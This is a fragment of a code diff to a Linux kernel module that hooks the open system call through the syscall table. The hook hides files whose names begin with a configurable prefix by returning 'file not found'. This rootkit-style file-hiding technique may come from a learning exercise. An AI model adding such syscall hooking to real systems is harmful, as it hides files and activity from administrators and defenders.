@@ -13,6 +13,7 @@
 
 static unsigned long** sys_64_tbl;
 unsigned long original_open;
+static int protectedSign = '_';
 
 static inline unsigned long __readcr0 (void)
 {
@@ -63,7 +64,7 @@ static long our_open(const char *filename, int flags, int mode)
     if (basename != NULL)
     {
         printk(KERN_DEBUG "BASENAME: %s", basename);
-        if (basename[0] == '_')
+        if (basename[0] == protectedSign)
         {
             return -ENOENT;
         }
@@ -99,4 +100,4 @@ MODULE_DESCRIPTION("hijack open system call");
 
 module_init(hijack_init);
 module_exit(hijack_cleanup);
-
+module_param(protectedSign, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
